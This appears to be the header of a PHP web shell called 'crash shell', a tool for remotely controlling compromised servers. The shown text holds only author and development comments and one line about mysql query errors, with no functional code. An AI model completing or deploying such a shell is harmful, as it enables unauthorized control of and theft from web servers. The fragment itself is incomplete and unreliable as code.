<?php
  /* crash shell by desert fox */
  /* most of the functions are from ani shells and cyber anarchy */
  /*using open cms for file browsers */
  
  //enabling commit in my github 
  
  //shell in the alpha developement stage
...
//mysql querry function errors will pop out here 
